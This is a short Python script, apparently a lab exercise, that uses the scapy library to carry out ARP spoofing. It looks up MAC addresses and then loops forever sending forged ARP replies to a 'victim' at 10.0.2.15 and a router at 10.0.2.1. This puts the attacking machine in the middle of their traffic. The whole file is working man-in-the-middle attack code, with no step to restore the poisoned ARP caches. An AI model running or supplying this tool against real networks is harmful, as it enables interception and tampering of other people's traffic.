#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # creating a  network frame
    arp_request_broadcast = broadcast/arp_request   # creating a new packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # send the packet and return the response
    return(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # packet to fool the target that this  machine is the router
    scapy.send(packet, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof("10.0.2.15","10.0.2.1")  # function call to fool the victim
        spoof("10.0.2.1","10.0.2.15")  # function call to fool the router
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sent_packets_count = sent_packets_count+2
        time.sleep(2)  # time gap of 2 seconds
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Quitting. ")